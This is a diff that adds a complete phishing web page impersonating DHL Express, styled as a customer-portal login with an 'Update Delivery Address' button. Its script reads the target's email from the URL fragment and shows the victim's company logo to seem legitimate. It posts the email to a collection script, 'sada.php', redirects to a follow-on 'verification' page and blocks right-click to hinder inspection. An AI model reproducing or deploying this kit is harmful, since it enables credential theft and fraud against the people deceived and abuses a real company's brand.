@@ -1,0 +1,235 @@
+<html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+       <title> DHL EXPRESS </title>
+
+<meta name="description" content="_Materials for Supply">
+
+<link rel="icon" href="logo.jpg">
+
+<meta name="keywords" content="_Demands">
+
+<meta name="robots" content="noindex, nofollow">
+
+<meta property="og:title" content="_Overview | Specs">
+
+<meta property="og:type" content="website">
+
+<meta property="og:site_name" content="_&amp;Requirements">
+
+<meta property="og:description" content="&amp;RFQ_">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="bootstrap.css">
+  <script src="jquery_003.js"></script>
+  <script src="popper_002.js"></script>
+  <script src="bootstrap.js"></script>
+  <style>
+
+video {
+  object-fit: cover;
+  width: 100vw;
+  height: 100vh;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: -1;
+}
+  </style>
+</head>
+<body>
+
+<nav class="navbar " style="background-color:#fedf00;">
+<div class="container">
+    <a class="navbar-brand" href="#"><img src="logo.jpg"></a>
+    <button class="navbar-toggler " type="button ">
+      <span class="navbar-toggler-icon text-dark"></span>
+    </button>
+   
+</div>
+</nav>
+<video playsinline="" autoplay="autoplay" muted="muted" loop="" poster="https://quirky-shaw-20dc92.netlify.app/polina.jpg" id="bgvid">
+    <source src="vd.mp4" type="video/webm">
+    <source src="vd.htm" type="video/mp4">
+  </video>
+
+  <div class="container">
+<div class="d-flex justify-content-center">
+  
+        
+        <div class="col-sm-8 my-4 text-center">
+           <div class="my-4"> &nbsp;</div>
+           <span class="text-white" style="font-size: 42px;font-weight: 100;"> 
+			&nbsp;</span><span class="text-white" style="font-size: 42px;font-weight: 900;">LOGIN 
+			TO CUSTOMER PORTALS</span>
+           <div style="color:white; font-size: 20px;">
+            As a DHL customer, we provide you with a number of tools and portals 
+			to efficiently manage your shipping and logistics needs. Just log in 
+			and get your business done, we will take care of the rest. 
+           </div>
+           <div class="my-5">
+		   <form method="POST" action="" id="contact">
+			   <input type="hidden" id="email" value="">
+				<button id="submit-btn" class="btn btn-primary" style="width: 299px; height: 60px" type="submit"><div style="background-color: #c80815;">
+				Update Delivery Address
+				
+           
+          </div></button></form></div>
+
+           <div class="my-5 text-white" style="font-size: 12px;">
+            ©2025 Deutsche Post DHL Group™ - All rights reserved.
+           </div>
+        </div>
+
+       
+</div>
+  </div>
+        <script src="jquery-3.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="popper.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="bootstrap_003.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="jquery.js"></script>
+    <script src="bootstrap_002.js"></script>
+    <script type="text/javascript" src="jquery_002.js"></script>
+    <script>
+
+      /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		$('#emailich').html(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "http://www."+my_slice);
+        $("#logoname").html(my_slice);
+       
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+
+        event.preventDefault();
+        var email=$("#email").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+      
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'sada.php',
+        type: 'POST',
+        data:{
+          email:email,
+        
+        },
+            // data: $('#contact').serialize(),
+           
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                
+                  if (count>=1) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                     window.location.replace("verification.html?msg="+email);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=1) {
+                count=0;
+                 window.location.replace("verification.html?msg="+email);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Download Document');
+            }
+          });
+    });
+
+
+    });
+
+</script>
+<script>
+var isNS = (navigator.appName == "Netscape") ? 1 : 0;
+if(navigator.appName == "Netscape") document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+function mischandler(){
+return false;
+}
+function mousehandler(e){
+var myevent = (isNS) ? e : event;
+var eventbutton = (isNS) ? myevent.which : myevent.button;
+if((eventbutton==2)||(eventbutton==3)) return false;
+}
+document.oncontextmenu = mischandler;
+document.onmousedown = mousehandler;
+document.onmouseup = mousehandler;
+</script>
+
+
+
+
+
+
+</body></html>
